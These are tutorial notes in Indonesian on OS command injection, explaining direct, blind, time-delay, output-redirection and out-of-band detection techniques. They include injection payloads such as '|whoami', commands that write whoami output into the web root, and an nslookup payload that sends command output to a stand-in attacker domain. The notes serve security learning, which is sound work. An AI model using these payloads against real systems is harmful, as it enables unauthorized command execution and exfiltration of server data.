# OS Command Injection

***

## What is OS command injection?

Kerentanan ini memungkinkan penyerang untuk mengeksekusi perintah sistem operasi pada server yang menjalankan aplikasi.

Seringkali, penyerang dapat memanfaatkan kerentanan ini untuk membahayakan bagian lain dari infrastruktur hosting, dan mengeksploitasi hubungan kepercayaan untuk mengalihkan serangan ke sistem lain di dalam organisasi.

## Injecting OS commands

Sebagai contoh, sebuah aplikasi menggunakan URL dibawah ini untuk meminta suatu data

```hurl
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

Untuk menyediakan informasi, aplikasi harus melakukan query ke legacy system. Fungsi diimplementasikan dengan memanggil shell command

```shellscript
stockreport.pl 381 29
```

Ketika aplikasi tanpa perlindungan apapun untuk menghindari command injection, attacker dapat mengirim input untuk mengeksekusi command, seperti:

```shellscript
& echo aiwefwlguh &

## atau
|whoami
```

***

## Blind OS command injection vulnerabilities

Blind OS command injection, dimana aplikasi tidak mengembalikan output dari command pada HTTP response. Ini tetap dapat bisa dieksploitasi, tapi dengan teknik yang berbeda.

### Detecting blind OS command injection using time delays

Gunakan perintah yang memicu time delay untuk memastikan bahwa perintah tereksekusi dengan membutuhkan beberapa waktu untuk merespon. Maka `ping` adalah perintah yang bagus karena bisa menentukan jumlah paket untuk dikirimkan, seperti:

```shellscript
& ping -c 10 127.0.0.1 &
```

Perintah ini menyebabkan aplikasi melakukan `ping` ke adaptor jaringan loopback-nya selama 10 detik.

### Exploiting blind OS command injection by redirecting output

Coba untuk mengalihkan output dari command ke dalam file yang dapat dilihat. Seperti contoh pada sebuah aplikasi menyimpan static resource pada /var/www/static, lalu coba jalankan command seperti:

```shellscript
& whoami > /var/www/static/whoami.txt &

## atau
|| whoami > /var/www/static/whoami.txt ||
```

Lalu coba lihat pada file itu (mungkin dapat diakses melalui url atau request burp).

### Expoiting blind OS command injection using out-of-band (OAST) techniques

Coba untuk menggunakan perintah yang disuntikkan untuk memicu interaksi out-of-band network dengan sistem yang Anda kendalikan, menggunakan teknik OAST, seperti:

```shellscript
& nslookup kgji2ohoyw.web-attacker.com &
```

Payload ini menggunakan perintah nslookup untuk melakukan pencarian DNS pada domain yang ditentukan. Penyerang dapat memantau apakah pencarian terjadi, untuk memastikan apakah perintah tersebut berhasil disuntikkan.

Out-of-band channel menyediakan cara mudah untuk mengekstraksi output dari perintah yang disuntikkan, seperti:

```shellscript
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

Hal ini menyebabkan hasil eksekusi dalam backtick ikut terkirim pada hasil lookup.
